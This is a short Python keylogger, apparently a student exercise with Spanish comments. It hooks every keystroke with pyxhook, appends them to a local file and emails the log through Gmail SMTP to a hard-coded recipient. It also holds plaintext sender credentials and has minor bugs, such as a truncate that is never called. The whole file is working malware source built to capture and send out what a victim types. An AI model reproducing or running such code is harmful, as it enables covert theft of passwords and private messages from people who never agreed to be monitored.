import pyxhook
import smtplib
import time



respuesta_afirmativa = ("yes", "y")
userMail = "keylogge111999r@gmial.com"
userPass = "lpwz sdli wmpv rwqf"
userTo = "siro@ciencias.unam.mx"
mailSubject = "Mail de prueba"

wait_seconds = 10 
timeout = time.time()  

def TimeOut(): 
    return time.time() > timeout 

def oneKeyEvent(event):
    with open("keyfile.txt", "a") as logKey: 
        try: 
            logKey.write(f"{event.Key}\n")
            return True
        except: 
            return False 

def callback():
    hm = pyxhook.HookManager()
    hm.KeyDown = oneKeyEvent
    hm.HookKeyboard()
    hm.start() 
    
def builtEmail(user, passw, recep, subj, body): 
    mailUser = user 
    mailPass = passw 
    From = user 
    To = recep 
    Subject = subj 
    Txt = body 
    
    email = """From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)
    
    # try: 
    server=smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login(mailUser, mailPass)
    server.sendmail(From, To, email)
    # except: 
    #     print("Correo Fallido")
        
def sendEmail(): 
    with open("keyfile.txt", "r+") as logkey: 
        data = logkey.read()
        data = data.replace("Space", " ")
        data = data .replace("\n", "")
        builtEmail(userMail,userPass,userTo, mailSubject, data)
        logkey.seek(0)
        logkey.truncate
     
if __name__ == "__main__":
    # enviar = input("¿Deseas enviar los registros por email?[y/n]") in respuesta_afirmativa  
    # guardar = input("¿Deseas guardar los registros en texto plano?[y/n]") in respuesta_afirmativa
    
    callback()
    
    if TimeOut(): 
        sendEmail()
        timeout = time.time() + wait_seconds 